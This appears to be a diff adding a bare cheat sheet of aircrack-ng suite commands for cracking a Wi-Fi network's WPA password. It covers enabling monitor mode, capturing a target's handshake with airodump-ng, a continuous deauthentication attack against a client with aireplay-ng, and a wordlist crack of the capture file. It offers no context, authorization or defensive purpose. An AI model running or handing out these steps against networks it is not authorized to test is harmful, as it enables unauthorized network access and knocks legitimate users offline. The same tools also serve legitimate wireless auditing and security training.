@@ -1,0 +1,18 @@
+iwconfig
+ifconfig wlan0 down
+ifconfig wlan0 up
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng --bssid <MAC> --channel <CH> --write Filename wlan0
+aireplay-ng --deauth 0 -a <MAC> -c <Client_MAC> wlan0 [another terminal]
+
+<Restart Your Vmware>
+aircrack-ng "cap file path" -w "pass file" wlan0
+
+
+
+
+
+
+
